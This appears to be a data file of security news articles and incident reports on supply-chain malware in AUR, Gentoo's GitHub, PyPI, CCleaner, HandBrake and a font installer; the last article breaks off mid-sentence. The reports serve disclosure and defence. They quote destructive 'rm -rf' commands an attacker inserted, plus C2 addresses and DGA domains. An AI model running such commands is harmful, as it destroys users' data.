article39 = "Published on None. Malware has been discovered in at least three Arch Linux packages available on AUR (Arch User Repository), the official Arch Linux repository of user-submitted packages.The malicious code has been removed thanks to the quick intervention of the AUR team.Info-stealer found in acroread Arch Linux packageThe incident happened because AUR allows anyone to take over orphaned repositories that have been abandoned by their original authors.On Saturday, a user going by the pseudonym of xeactor took over one such orphaned package named acroread that allows Arch Linux users to view PDF files.According to a Git commit to the packages source code, xeactor added malicious code that would download a file named ~x from ptpb.pw, a lightweight site mimicking Pastebin that allows users to share small pieces of texts.When the user would install the xeactor package, the users PC would download and execute the ~x file [VirusTotal, source code], which would later download and run another file named ~u [VirusTotal, source code].Besides downloading ~u, the main purpose of the first file (~x) was also to modify systemd and add a timer to run the ~u file at every 360 seconds.Malware didnt do muchThe purpose of the second file (~u) was to collect data about each infected system and post these details inside a new Pastebin file, using the attackers custom Pastebin API key.Collected data includes details such as the date and time, machines ID, CPU information, Pacman (package manager) details, and the outputs of the uname -a and systemctl list-units commands.No other malicious actions were observed, meaning the acroread package wasnt harming users systems, but merely collecting data in preparation for... something else.There isnt a self-update mechanism included, meaning xeactor would have needed a second acroread package update to deploy more intrusive code, or potentially another malware strain.Two other yet-to-be-named packages also found infectedThe AUR team also said it found similar code in two other packages that the xeactor user had recently taken over. The following packages and versions were known to be affected:acroread 9.5.5-8balz 1.20-3minergate 8.1-2All malicious changes to all three packages have now been reversed, and xeactors account has been suspended. The AUR repository should not be confused with official pacakges in the Arch Build System (ABS). AUR packages are user generated and submitted to the repository, while ABS packages are official packages from trusted sources. The Arch Linux team has warned users for years about verifying each AUR package before installing it.The Arch Linux team is the second Linux distro that has found malware on its user-submitted package repository this year. In May, the Ubuntu Store team found a cryptocurrency miner hidden in an Ubuntu package named 2048buntu." 
article40 = "Published on 2018-06-28 00:00:00. Incident metadataStatus: ResolvedIncident Commander: Robbat2Incident Backups: MGorny, AntarusCommunications: Antarus, Dilfridge,Private Incident Page: (for infra only): https://infrawiki.gentoo.org/github-2018-06-28Incident summaryAn unknown entity gained control of an admin account for the Gentoo GitHub Organization and removed all access to the organization (and its repositories) from Gentoo developers. They then proceeded to make various changes to content. Gentoo Developers & Infrastructure escalated to GitHub support and the Gentoo Organization was frozen by GitHub staff. Gentoo has regained control of the Gentoo GitHub Organization and has reverted the bad commits and defaced content.ImpactApproximately 5 days of GitHub being unavailable for Gentoo use.Pull request CI was down; only master was being tested for issues.The Gentoo Proxy Maintainers Project was impacted as many proxy-maint contributors use GitHub to submit PRs.All past pull requests were apparently disconnected from their original commits and closed. GitHub cant fix it for us, so users have to open new pull requests.The entity attempted to wipe user content by adding rm -rf to various repositories; however this code was unlikely to be executed by end users due to various technical guards in place.Development not related to proxy-maint continued as normal; over 700 commits were made during the incident.Malicious content availableInitial clones of these repositories during these time intervals will have malicious content. Gentoo recommends recreating these from a new clone if you cloned during this period.gentoo/gentoo: (2018-06-28 20:38 - 2018-06-29 06:58)gentoo/musl: (2018-06-28 20:56 - 2018-06-29 06:59)gentoo/systemd: (2018-06-28 21:07 - 2018-06-29 06:57)Root causeThe attacker gained access to a password of an organization administrator. Evidence collected suggests a password scheme where disclosure on one site made it easy to guess passwords for unrelated webpages.BackgroundGentoos use of GitHubThe main Gentoo repositories are kept on Gentoo hosted infrastructure and Gentoo mirrors to GitHub in order to be where the contributors are. We do not believe the private keys of the account impacted were at risk, and so the gentoo-hosted infrastructure was not impacted by this incident.LessonsWhat went wellGentoo responded quickly to reports of problems.GitHub responded quickly and had a function to hide the impacted organization.Gentoo quickly removed account access once the entry point was located.GitHub provided audit logs that helped map out the incident.What went badlyInitial communications were unclear and lacking detail in two areas. How can users verify their tree to be sure they had a clean copy? Clearer guidelines that even if users got bad copies of data with malicious commits, that the malicious commits would not execute.Communications had three avenues (www.gentoo.org, infra-status.gentoo.org, and email lists.) Later we added a wiki page (this page) and were inconsistent on where to get updates.GitHub failed to block access to the repositories via git, resulting in the malicious commits being externally accessible. Gentoo had to force-push over them as soon as this was discovered that.Credential revocation procedures were incomplete.We did not have a backup copy of the Gentoo GitHub Organization detail.The systemd repo is not mirrored from Gentoo, but is stored directly on GitHub.Lucky itemsNumerous Gentoo Developers have personal contacts at GitHub, and in the security industry and these contacts proved valuable throughout the incident response.The attack was loud; removing all developers caused everyone to get emailed. Given the credential taken, its likely a quieter attack would have provided a longer opportunity window.The method by which the attackers pushed commits (force pushing their commits) made downstream consumption more conspicuous; this would have blocked git from silently pulling in new content to existing checkouts on git pull.Action itemsaction-item: make frequent offline backup of GH settingsaction-item: stream GH audit log into gentoo infra https://developer.github.com/v3/activity/events/types/#organizationevent here as well.action-item: review 2FA requirements for GitHub org Done: Gentoo GitHub Organization currently requires 2FA to join.action-item: reduce number of people with GitHub owner power https://www.terraform.io/docs/providers/github/r/team_repository.html: Consider complete automation of org, from git with terraform as actuation with service account.action-item: be more proactive in retiring inactive people from infra In-Progress: Bugs open to retire inactive infra members.action-item: see if there is a way we can receive email for everybody as they are added to the org https://developer.github.com/v3/activity/events/types/#organizationevent; a hook is under development to keep an off-GitHub log.action-item: validate infra member retirement procedures separately from undertaker procedures. Note: During the access revocation, some hosts were missed.action-item: prod gentoo-infra members to start using local password managers (pass, gopass, etc.) In-Progress: Draft guidelines are being reviewed.action-item: Apply 2fa protection to gentoo services generally for all users.action-item: Document an incident plan for communications. Done: Incident plan is in place.action-item: sponsor potential for hardware based 2FA for Gentoos devs? (C.f. nitrokey / Linux Foundation) Done: Gentoo Foundation partnered with NitroKey to equip all Gentoo Developers with USB keys.action-item: Publish clear password policy for the org, including recommendations for password management. In-Progress: Draft guidelines are being reviewed.action-item: mirror systemd and musl repos on git.gentoo.org In-Progressaction-item: Audit gentoo system logins for 90d to verify no unexpected activity.action-item: Audit logs for compromised account. This item is complete.action-item: Rotate credentials for compromised account. This item is complete.TimelineThese times are in UTC and are compiled from IRC and activity logs.2018-04-08 - 2018-06-27Logs indicate that various GitHub accounts were probed looking for vulnerable accounts.2018-06-2820:05 2nd to last known legimate commit to gentoo/gentoo . Matches git.gentoo.org/repo/gentoo.git Auto-pushed by mirror bot. Commit ID 38281f4252f89e3ef9cbae54dfc1ad553d296979. Matches 20:08 Last known legimate commit to gentoo/musl . matches git.gentoo.org/proj/musl.git . Commit ID 60461ca1385809bacf6a114a7f1ecfe22f6da47f. matches . 20:19 Attacker tries a bad password on the account.20:19 Attacker successfully gains administrative access20:25 Attacker invites a dummy account to the org20:25 Attacker creates a dummy account with administrative access.20:25 Last known legimate commit to gentoo/gentoo . Matches git.gentoo.org/repo/gentoo.git Auto-pushed by mirror bot. Commit ID 73b724093b9c2a8756b8c35d3e09793342fa9ca9 Does NOT appear in the GitHub audit log for the org.. Matches 20:25 Attacker starts removing valid users20:26 Earliest email timestamp of someone being removed from the organization.20:29 First person notices that something is going on with the GitHub organization20:30 Attacker invites a second malicious user.20:32 Attacker adds second malicious user with admin privileges.20:34 Malicious commit to gentoo/gentoo, 73b72409->fdd8da2e adds readme.md file with racist text.20:36 First report to Infra that something is going on with the GitHub organization.20:38 Malicious commit to gentoo/gentoo, fdd8da2e->49464b73. adds rm -rf /*& at the top of skel.ebuild20:39 Attacker changes billing email, the first time.20:45 Malicious commit 49464b73 is first noticedis first noticed 20:48 Attacker changes billing email, the second time20:49 First abuse report to GitHub support20:50 Malicious commit to gentoo/gentoo, 49464b73->afcdc03b. adds rm -rf /* at the top of every ebuild.20:51 Infras informal contact to GitHub via multiple personal channels20:53 Second abuse report to GitHub20:55 Malicious commit to gentoo/gentoo , afcdc03b -> e6db0eb4 , force-push. Squash of entire history as of afcdc03b ( rm -rf /* in ebuilds), -> , force-push. 20:56 Malicious commit to gentoo/musl , 60461ca1 -> e6db0eb4 . Force-push. Same history as gentoo/gentoo in a squashed commit., -> . Force-push. 21:00 (approx) GitHub informal report that they are starting to look21:05 Infras formal ticket to GitHub Support21:07 Malicious commit to gentoo/systemd , bf0e0a4d -> 50e3544d . Payload: slightly obfuscated rm -rf $HOME ~/ at the top of the configure script., -> . 21:11 Malicious commit to gentoo/systemd, 50e3544d -> c46d8bbf . Force-push. Revert of previous commit bf0e0a4d squashed with commit 50e3544d.-> . Force-push. 21:28 GitHub support responds; Gentoo GitHub org frozen.22:14 Gentoo emails GitHub requesting activity logs.22:45 GitHub locks suspected entry point GitHub does not disclose this to Gentoo, its found in an audit log of the compromised users account on 2018-06-29T14:30:18Z22:47 GitHub responds, assuring Gentoo that the audit is ongoing and logs will be produced soon.23:35 GitHub provides limited access to the org to Gentoo.23:40 Gentoo determines which account was the entry point. Gentoo Infra preemptively removes all access for that account from primary Gentoo properties (git repos, bugs, email, etc.)23:47 GitHub formally responds with audit logs and security recommendations (e.g. 2FA)2018-06-2900:00 Gentoo reviews activity of compromised account to see if it was used on other services.00:05 Gentoo emails GitHub, requesting the org be hidden again while Gentoo affects repairs. Of particular concern are the PRs and how we can audit them.00:25 GitHub responds saying they have re-hidden the org, and will wait for confirmation before un-hiding it again, but are concerned about proper operation for organization members01:20 Gentoo responds to GitHub saying keeping it hidden during the investigation is preferable to keeping it operable (but potentially unreliable / malicious.01:38 GitHub and Gentoo discuss various cleanup strategies over email.02:33 Formal request from Gentoo to GitHub for an audit log for the affected compromised account (with explicit consent from the compromised user.)05:27 Gentoo Infra restores billing email.06:39 Gentoo emails GitHub request incident commander handoff (robbat2 => mgorny) and we trade contact information.06:57 Gentoo Infra does force-push on gentoo/systemd to restore state. c46d8bbf->bf0e0a4d.to restore state. c46d8bbf->bf0e0a4d. 06:58 Gentoo Infra does force-push on gentoo/gentoo to restore state. e6db0eb4->73b72409. Push takes several minutes due to size.to restore state. e6db0eb4->73b72409. 06:59 Gentoo Infra does force-push on gentoo/musl to restore state. e6db0eb4->60461ca1.to restore state. e6db0eb4->60461ca1. 13:05 GitHub unlocks the compromised account and resets the password.14:14 Compromised account holder regains account access, produces a security log from that account.14:29 Gentoo does another incident handoff (mgorny => robbat2) and Gentoo requests an update on the remediation plan for open PR requests.20:07 GitHub responds with a statement that they are still working on a remediation plan.20:46 Gentoo emails GitHub asking for an ETA for remediation.23:06 GitHub responds with an ETA for the remediation. Internal discussion ensues regarding whether to wait, or try to unlock the org over the weekend.2018-06-3001:47 Attacker probes compromised account to see if the stolen credential still functions; but this attempt fails.17:34 Gentoo emails GitHub asking for clarification on remediation actions and what security logs Gentoo thinks are still required.2018-07-0107:41 Gentoo requests status update from GitHub.2018-07-0303:51 GitHub responds with the result of their investigation and described remediation actions they took on their side.10:10 Gentoo responds to GitHub and asks that the organization be made public so Gentoo can conclude repairs.11:46 GitHub responds and unlocks the Gentoo GitHub Organization, making it publicly visible once again,AppendixKnown malicious contentThe following commits were known to be introduced by the unknown entities. They were only present on the GitHub-hosted repositories, and never present on the Gentoo-hosted master repositories.gentoo/gentoo, master branch: e6db0eb4 (force-push) afcdc03b 49464b73 fdd8da2egentoo/musl, master branch: e6db0eb4 (force-push)gentoo/systemd c46d8bbf (force-push) 50e3544dOnce Gentoo regained access to the GitHub repositories, we forced-pushed over these malicious repos."
article41 = "Published on None. Microsoft said today that hackers compromised a font package installed by a PDF editor app and used it to deploy a cryptocurrency miner on users computers.The OS maker discovered the incident after its staff received alerts via the Windows Defender ATP, the commercial version of the Windows Defender antivirus.Microsoft employees say they investigated the alerts and determined that hackers breached the cloud server infrastructure of a software company providing font packages as MSI files. These MSI files were offered to other software companies.One of these downstream companies was using these font packages for its PDF editor app, which would download the MSI files from the original companys cloud servers during the editors installation routine.Hackers created a copy of the companys cloud serversAttackers recreated the [first companys] infrastructure on a replica server that the attackers owned and controlled. They copied and hosted all MSI files, including font packages, all clean and digitally signed, in the replica server, Microsofts security researchers said.The attackers decompiled and modified one MSI file, an Asian fonts pack, to add the malicious payload with the coin mining code, they added.Using an unspecified weakness (which does not appear to be MITM or DNS hijack), the attackers were able to influence the download parameters used by the [PDF editor] app. The parameters included a new download link that pointed to the attacker server, Microsoft said.Users who downloaded and ran the PDF editor app would unknowingly install the font packages, including the malicious one, from the hackers cloned server.Supply chain attack within a supply chainBecause the PDF editor app was installed under SYSTEM privileges, the malicious coinminer code hidden inside would receive full access to a users system.The malicious miner would create its own process named xbox-service.exe under which it would mine for cryptocurrencies using victims computers.Microsoft said Windows Defender ATP detected mining-specific behavior from this process. Investigators then tracked down the origin of this process to the PDF editor app installer and the MSI font packages.Security researchers said it was easy to identify which MSI font package was the malicious one because all other MSI files were signed by the original software company, except one file, which lost its authenticity when crooks injected the coinminer code inside it.This malicious miner also stood out to investigators because it also tried to modify the Windows hosts file in a poor attempt at sinkholing update operations for various security apps. Tinkering with the Windows hosts file is a big no-no, and most antivirus software will mark this operation as suspicious or malicious.Microsoft did not reveal the names of the two software companies involved in this incident. The OS maker says the compromise lasted between January and March 2018, and affected only a small number of users, suggesting the hacked companies arent big names on the PDF software market.Indicators of compromise are available in Microsofts report on the attack, here."
article42 = "Published on 2018-10-22 03:18:24.601000+00:00. Cryptocurrency Clipboard Hijacker Discovered in PyPI Repository Bertus · Follow · Oct 21, 2018 4 min read -- 2 Listen Share21 Oct 2018If youve ever installed a PyPI package named colourama, you probably want to read further.As mentioned in a previous blog post (Detecting Cyber Attacks on PyPI), for the last year I have been doing research on automated detection of malicious code in the PyPI repository. In an initial scan of the PyPI repository earlier this year, I detected eleven malicious packages and reported them to the PyPI maintainers privately. Since then, Ive continued improvements to the detection tool and recently rescanned the PyPI repository.While analyzing the data from the rescan, I discovered an interesting PyPI package named colourama. The package is typo-squatting the popular PyPI package named colorama. The colourama package contains a malware dropper which targets Windows machines and downloads a second stage that implements a cryptocurrency clipboard hijacker written in VBScript. When the VBScript executes, it creates a new script and adds a Windows registry entry to execute it whenever the user logs into the machine. This script runs in the background and checks the Windows clipboard every 500 ms. If the script detects anything on the clipboard that resembles a bitcoin address, it replaces it with a bitcoin address under control of the attacker. This means that at any time a user of the machine attempts to pay someone with bitcoins by copying a bitcoin address from an email or website, it will be replaced by the attackers bitcoin address.Details about the Colourama PackageThe colourama package have been on PyPI since December 5th, 2017. The author seems to have copied the colorama code and then added special installer code (the malware dropper). According to pypistats.org it has been downloaded 55 times in the last month. The package has been reported to the PyPI administrators.RecommendationsIt would be a good idea to uninstall the colourama package, however this will not stop or remove the malicious VBScript. The colourama package downloads and installs the malicious VBScript during installation, but never uninstalls it.Based on my analysis of the code, to fully remove this malware the following should be done (however, it is your responsibility to safely delete files and registry entries and do your own due diligence based on your specific PC):Delete the VBScript installed in PROGRAMDATA under \Microsoft Essentials\Software Essentials.vbs. Delete the Microsoft Software Essentials registry entry under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run. Stop the associated process — it will likely show up as wscript in the process list or alternatively restart the machine.Detailed Analysis of the Malicious CodeThe setup.py file in colourama package contains the following class that is called as part of the package install.The request to hxxps://grabify.link/E09EIF seems like it is used for tracking installs of the package since it just redirects to tacobells website and the response data is not used by the code. Using grabify.link gives the bad actor the ability to track the amount of installs, the OS on which it was installed and the IP address of where the package were installed. The large base64 encoded string (redacted from the code snippet above for brevity) is decoded and executed as Python code. The code contained in the base64 encoded string is shown below:"
article43 = "Published on 2017-09-18 07:51:00+00:00. Update 9/18: CCleaner Cloud version 1.07.3191 is also reported to be affectedUpdate 9/19: This issue was discovered and reported by both Morphisec and Cisco in separate in-field cases and reported separately to Avast.Update 9/19: There has been some confusion on how the DGA domains resolve.The fallback command and control scheme in use by the CCBkdr involves:1. Generating a Monthly Domain name (all of which are controlled by Talos for 2017)2. Request the A records for the domain.3. 16 bits of the true destination IP are encoded in the first A record, 16 bits are encoded in the second A record4. The true destination IP is then computed and connected to.To control the connections Talos has to create two IPs such that they can be fed into the application to resolve to the sinkhole IP.32 bits of random data were generated. 16 bits of that were combined with 16 bits of the destination address to create the first A record. The remaining 16 random bits were combined with the remaining bits of the destination address to create the second A record.The resulting two A record IP addresses were then assigned to the DNS configuration.There was no analysis performed on the selected addresses beyond that they could be combined to create the destination.Update 9/20: Continued research on C2 and payloads can be found here: /ccleaner-c2-concernIntroductionSupply chain attacks are a very effective way to distribute malicious software into target organizations. This is because with supply chain attacks, the attackers are relying on the trust relationship between a manufacturer or supplier and a customer. This trust relationship is then abused to attack organizations and individuals and may be performed for a number of different reasons. The Nyetya worm that was released into the wild earlier in 2017 showed just how potent these types of attacks can be. Frequently, as with Nyetya, the initial infection vector can remain elusive for quite some time. Luckily with tools like AMP the additional visibility can usually help direct attention to the initial vector.Talos recently observed a case where the download servers used by software vendor to distribute a legitimate software package were leveraged to deliver malware to unsuspecting victims. For a period of time, the legitimate signed version of CCleaner 5.33 being distributed by Avast also contained a multi-stage malware payload that rode on top of the installation of CCleaner. CCleaner boasted over 2 billion total downloads by November of 2016 with a growth rate of 5 million additional users per week. Given the potential damage that could be caused by a network of infected computers even a tiny fraction of this size we decided to move quickly. On September 13, 2017 Cisco Talos immediately notified Avast of our findings so that they could initiate appropriate response activities. The following sections will discuss the specific details regarding this attack.Technical DetailsCCleaner is an application that allows users to perform routine maintenance on their systems. It includes functionality such as cleaning of temporary files, analyzing the system to determine ways in which performance can be optimized and provides a more streamlined way to manage installed applications.Figure 1: Screenshot of CCleaner 5.33On September 13, 2017 while conducting customer beta testing of our new exploit detection technology, Cisco Talos identified a specific executable which was triggering our advanced malware protection systems. Upon closer inspection, the executable in question was the installer for CCleaner v5.33, which was being delivered to endpoints by the legitimate CCleaner download servers. Talos began initial analysis to determine what was causing this technology to flag CCleaner. We identified that even though the downloaded installation executable was signed using a valid digital signature issued to Piriform, CCleaner was not the only application that came with the download. During the installation of CCleaner 5.33, the 32-bit CCleaner binary that was included also contained a malicious payload that featured a Domain Generation Algorithm (DGA) as well as hardcoded Command and Control (C2) functionality. We confirmed that this malicious version of CCleaner was being hosted directly on CCleaners download server as recently as September 11, 2017.In reviewing the Version History page on the CCleaner download site, it appears that the affected version (5.33) was released on August 15, 2017. On September 12, 2017 version 5.34 was released. The version containing the malicious payload (5.33) was being distributed between these dates. This version was signed using a valid certificate that was issued to Piriform Ltd by Symantec and is valid through 10/10/2018. Piriform was the company that Avast recently acquired and was the original company who developed the CCleaner software application.Figure 2: Digital Signature of CCleaner 5.33A second sample associated with this threat was discovered. This second sample was also signed using a valid digital certificate, however the signing timestamp was approximately 15 minutes after the initial sample was signed.The presence of a valid digital signature on the malicious CCleaner binary may be indicative of a larger issue that resulted in portions of the development or signing process being compromised. Ideally this certificate should be revoked and untrusted moving forward. When generating a new cert care must be taken to ensure attackers have no foothold within the environment with which to compromise the new certificate. Only the incident response process can provide details regarding the scope of this issue and how to best address it.Interestingly the following compilation artifact was found within the CCleaner binary that Talos analyzed:S:\workspace\ccleaner\branches\v5.33\bin\CCleaner\Release\CCleaner.pdbGiven the presence of this compilation artifact as well as the fact that the binary was digitally signed using a valid certificate issued to the software developer, it is likely that an external attacker compromised a portion of their development or build environment and leveraged that access to insert malware into the CCleaner build that was released and hosted by the organization. It is also possible that an insider with access to either the development or build environments within the organization intentionally included the malicious code or could have had an account (or similar) compromised which allowed an attacker to include the code.It is also important to note that while previous versions of the CCleaner installer are currently still available on the download server, the version containing the malicious payloads has been removed and is no longer available.Malware Installation and OperationWithin the 32-bit CCleaner v5.33 binary included with the legitimate CCleaner v5.33 installer, __scrt_get_dyn_tls_init_callback was modified to call to the code at CC_InfectionBase(0x0040102C). This was done to redirect code execution flow within the CCleaner binary to the malicious code prior to continuing with the normal CCleaner operations. The code that is called is responsible for decrypting data which contains the two stages of the malicious payload, a PIC (Position Independent Code) PE loader as well as a DLL file that effectively functions as the malware payload. The malware author had tried to reduce the detection of the malicious DLL by ensuring the IMAGE_DOS_HEADER was zeroed out, suggesting this attacker was trying to remain under the radar to normal detection techniques.The binary then creates an executable heap using HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0). Space is then allocated to this new heap which is where the contents of the decrypted data containing the malware is copied. As the data is copied to the heap, the source data is erased. The PE loader is then called and begins its operation. Once the infection process has been initiated, the binary erases the memory regions that previously contained the PE loader and the DLL file, frees the previously allocated memory, destroys the heap and continues on with normal CCleaner operations.The PE loader utilizes position independent coding practices in order to locate the DLL file within memory. It then maps the DLL into executable memory, calls the DLLEntryPoint to begin execution of the DLL being loaded and the CCleaner binary continues as normal. Once this occurs the malware begins its full execution, following the process outlined in the following sections.CBkrdr.dllThe DLL file (CBkdr.dll) was modified in an attempt to evade detection and had the IMAGE_DOS_HEADER zeroed out. The DLLEntryPoint creates an execution thread so that control can be returned to the loader. This thread is responsible for calling CCBkdr_GetShellcodeFromC2AndCall. It also sets up a Return Oriented Programming (ROP) chain that is used to deallocate the memory associated with the DLL and exit the thread.CCBkrdr_GetShellcodeFromC2AndCallThis function is responsible for much of the malicious operations that Talos observed while analyzing this malware. First, it records the current system time on the infected system. It then delays for 601 seconds before continuing operations, likely an attempt to evade automated analysis systems that are configured to execute samples for a predefined period of time or determine whether the malware is being executed in a debugger. In order to implement this delay functionality, the malware calls a function which attempts to ping 224.0.0.0 using a delay_in_seconds timeout set to 601 seconds. It then checks to determine the current system time to see if 600 seconds has elapsed. If that condition is not met, the malware terminates execution while the CCleaner binary continues normal operations. In situations where the malware is unable to execute IcmpCreateFile, it then falls back to using Sleep() to implement the same delay functionality. The malware also compares the current system time to the value stored in the following registry location:HKLM\SOFTWARE\Piriform\Agomo:TCIDIf the value stored in TCID is in the future, the malware will also terminate execution.Figure 3: Delay RoutineThe malware then checks to determine the privileges assigned to the user running on the system. If the current user running the malicious process is not an administrator the malware will terminate execution.Figure 4: Privilege CheckIf the user executing the malware does have administrative privileges on the infected system, SeDebugPrivilege is enabled for the process. The malware then reads the value of InstallID which is stored in the following registry location:HKLM\SOFTWARE\Piriform\Agomo:MUIDIf this value does not exist, the malware creates it using ((rand()*rand() ^ GetTickCount()).Once the aforementioned activities have been performed, the malware then begins profiling the system and gathering system information which is later transmitted to the C2 server. System information is stored in the following data structure:Figure 5: CCBkdr_System_Information Data StructureOnce the system information has been collected, it is encrypted and then encoded using modified Base64. The malware then establishes a Command and Control (C2) channel as described in the following section.Command and Control (C2)While analyzing this malware, Talos identified what appears to be a software bug present in the malicious code related to the C2 function. The sample that Talos analyzed reads a DGA computed IP address located in the following registry location, but currently does nothing with it:HKLM\SOFTWARE\Piriform\Agomo:NIDIt is unknown what the purpose of this IP address is at this time, as the malware does not appear to make use of it during subsequent operations. In any event, once the previously mentioned system information has been collected and prepared for transmission to the C2 server, the malware will then attempt to transmit it using an HTTPS POST request to 216[.]126[.]225[.]148. The HTTPS communications leverage a hardcoded HTTP Host header that is set to speccy[.]piriform[.]com, a legitimate platform which is also created by Piriform for hardware monitoring. This could make dynamic analysis more difficult as the domain would appear to be legitimate and perhaps even expected depending on the victim infrastructure. The requests also leverage HTTPS but ignore all security errors as the server currently returns a self-signed SSL certificate that was issued to the subdomain defined in the Host header field. In cases where no response is received from the C2 server, the malware then fails back to a Domain Generation Algorithm (DGA) as described in the section Domain Generation Algorithm of this post.Once a C2 server has been identified for use by the malware, it then sends the encoded data containing system profile information and stores the C2 IP address in the following registry location:HKLM\SOFTWARE\Piriform\Agomo:NIDThe malware then stores the value of the current system time plus two days into the following registry location:HKLM\SOFTWARE\Piriform\Agomo:TCIDData received from the C2 server is then validated to confirm that the received data is in the correct format for a CCBkdr_ShellCode_Payload structure. An example is shown below:Figure 6: CCBkdr_ShellCode_Payload Data StructureThe malware then confirms that the value of EncryptedInstallID matches the value that was previously transmitted to the C2 server. It then allocates memory for the final shellcode payload. The payload is then decoded using modified Base64 and stored into the newly allocated memory region. It is then decrypted and called with the addresses of LoadLibraryA and GetProcAddress as parameters. Once the payload has been executed, the memory is deallocated and the following registry value is set to the current system time plus seven days:HKLM\SOFTWARE\Piriform\Agomo:TCIDThe received buffer is then zeroed out and deallocated. The CCBkdr_ShellCode_Payload structure is also deallocated and the malware then continues with normal CCleaner operations. A diagram describing the high level operation of this malware is below:Figure 7: Malware Operation Process FlowDomain Generation AlgorithmIn situations where the primary C2 server does not return a response to the HTTP POST request described in the previous section, the malware fails back to using a DGA algorithm. The algorithm used by this malware is time-based and can be calculated using the values of year and month. A list of DGA domains is below:Figure 8: 12 Month DGA Genearation The malware will initiate DNS lookups for each domain generated by the DGA algorithm. If the DNS lookup does not result in the return of an IP address, this process will continue. The malware will perform a DNS query of the active DGA domain and expects that two IP addresses will be returned from the name server managing the DGA domains namespace. The malware will then compute a secondary C2 server by performing a series of bit operations on the returned IP address values and combine them to determine the actual fallback C2 server address to use for subsequent C2 operations. A diagram showing this process is below:Figure 9: C2 Process DiagramCisco Talos observed during analysis that the DGA domains had not been registered, so we registered and sinkholed them to prevent attackers from being able to use them for malicious purposes.Potential ImpactThe impact of this attack could be severe given the extremely high number of systems possibly affected. CCleaner claims to have over 2 billion downloads worldwide as of November 2016 and is reportedly adding new users at a rate of 5 million a week.Figure 10: CCleaner Consumer DemographicsIf even a small fraction of those systems were compromised an attacker could use them for any number of malicious purposes. Affected systems need to be restored to a state before August 15, 2017 or reinstalled. Users should also update to the latest available version of CCleaner to avoid infection. At the time of this writing that is version 5.34. It is important to note that according to the CCleaner download page, the free version of CCleaner does not provide automated updates, so this might be a manual process for affected users.In analyzing DNS-based telemetry data related to this attack, Talos identified a significant number of systems making DNS requests attempting to resolve the domains associated with the aforementioned DGA domains. As these domains have never been registered, it is reasonable to conclude that the only conditions in which systems would be attempting to resolve the IP addresses associated with them is if they had been impacted by this malware. While most of the domains associated with this DGA have little to no request traffic associated with them, the domains related to the months of August and September (which correlates with when this threat was active in the wild) show significantly more activity.Looking at the DNS related activity observed by Cisco Umbrella for the month of July 2017 (prior to CCleaner 5.33 being released) we observed very little in the way of DNS requests to resolve the IP address for DGA domain associated with this malware:Figure 11: DNS Activity for July 2017 DGA DomainAs mentioned earlier in this post, the version of CCleaner that included this malware was released on August 15, 2017. The following graph shows a significant increase in the amount of DNS activity associated with the DGA domain used in August 2017:Figure 12: DNS Activity for August 2017 DGA DomainLikewise, the DGA domain associated with September 2017 reflects the following activity with regards to attempts to resolve the IP associated with it:Figure 13: DNS Activity for September 2017 DGA DomainNote that in on September 1, 2017 it appears that the DNS activity shifted from the DGA domain previously used in August, to the one used in September, which matches the time-based DGA algorithm described in the Domain Generation Algorithm section of this blog post. After reaching out to Avast we noted that the server was taken down and became unavailable to already infected systems. As a result, we saw a significant increase in the amount of requests that were being directed at the failback DGA domains used by the malware.Figure 14: Traffic Spike Following Server TakedownIt is also worth noting that at the time of this post, antivirus detection for this threat remains very low (The detections are at 1/64 at the time of this writing).Figure 14: VirusTotal Detections for CCleaner BinaryAs part of our response to this threat, Cisco Talos has released comprehensive coverage to protect customers. Details related to this coverage can be found in the Coverage section of this post.ConclusionThis is a prime example of the extent that attackers are willing to go through in their attempt to distribute malware to organizations and individuals around the world. By exploiting the trust relationship between software vendors and the users of their software, attackers can benefit from users inherent trust in the files and web servers used to distribute updates. In many organizations data received from commonly software vendors rarely receives the same level of scrutiny as that which is applied to what is perceived as untrusted sources. Attackers have shown that they are willing to leverage this trust to distribute malware while remaining undetected. Cisco Talos continues to monitor all aspects of the threat landscape to quickly identify new and innovative techniques used by attackers to target organizations and individuals around the world.CoverageThe following ClamAV signatures have been released to detect this threat: 6336251, 6336252.Additional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWS orWSA web scanning prevents access to malicious websites and detects malware used in these attacks.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Indicators of Compromise (IOCs)File Hashes6f7840c77f99049d788155c1351e1560b62b8ad18ad0e9adda8218b9f432f0a91a4a5123d7b2c534cb3e3168f7032cf9ebf38b9a2a97226d0fdb7933cf6030ff36b36ee9515e0a60629d2c722b006b33e543dce1c8c2611053e0651a0bfdb2e9DGA Domainsab6d54340c1a[.]comaba9a949bc1d[.]comab2da3d400c20[.]comab3520430c23[.]comab1c403220c27[.]comab1abad1d0c2a[.]comab8cee60c2d[.]comab1145b758c30[.]comab890e964c34[.]comab3d685a0c37[.]comab70a139cc3a[.]comIP Addresses216[.]126[.]225[.]148"
article44 = "Published on None. Posted: May 8, 2017 byThe website of the popular HandBrake DVD-ripping app has been hacked, and for 4 days, a maliciously-modified copy of the app was installing a new variant of the mysterious Proton malware.Last year, the Transmission torrent app was hacked not just once, but twice, to install the KeRanger ransomware and, later, the Keydnap backdoor. Now, the same thing has happened to the popular DVD-ripping HandBrake app, which is installing a new variant of the Proton malware.The real HandBrake 1.0.7 app was replaced with a malicious copy on May 2. This issue was discovered and the malicious app was removed on May 6, also a security warning was posted on the HandBrake website. Both the HandBrake website and the copy of HandBrake available via Homebrew (a command-line software installation system) were affected.Am I infected?The security warning provides SHA1 and SHA256 hashes for the malicious HandBrake-1.0.7.dmg file, recommending that you check this against the hash of your download before installing. To do this, enter the following command in the Terminal app (found in the Utilities folder in the Applications folder):shasum /path/to/HandBrake-1.0.7.dmg(Of course, be sure to insert the proper path to the .dmg file. Note that you can drag a file onto the Terminal window to insert its path into the command automatically.)Compare the value returned by this command to the SHA1 hash. If its a match, throw that .dmg file in the trash, delete your copy of HandBrake, and scan your Mac with Malwarebytes for Mac. We detect this malware as OSX.Proton.At this point, you can - in theory - safely download a new copy of HandBrake. I say in theory because we dont know yet how the HandBrake site was hacked and what mitigations have been put in place to prevent future hacks.If you download a new copy of HandBrake, you can check it against the checksums listed on the HandBrake site to verify that it is valid. However, theres a big problem with this: If the website has been hacked to replace the legit copy of the software with a bad one, its reasonable to assume that the checksums there could be replaced with bad ones as well.Unfortunately, HandBrake is not code signed, so theres no real way to verify with 100% certainty that the copy you have 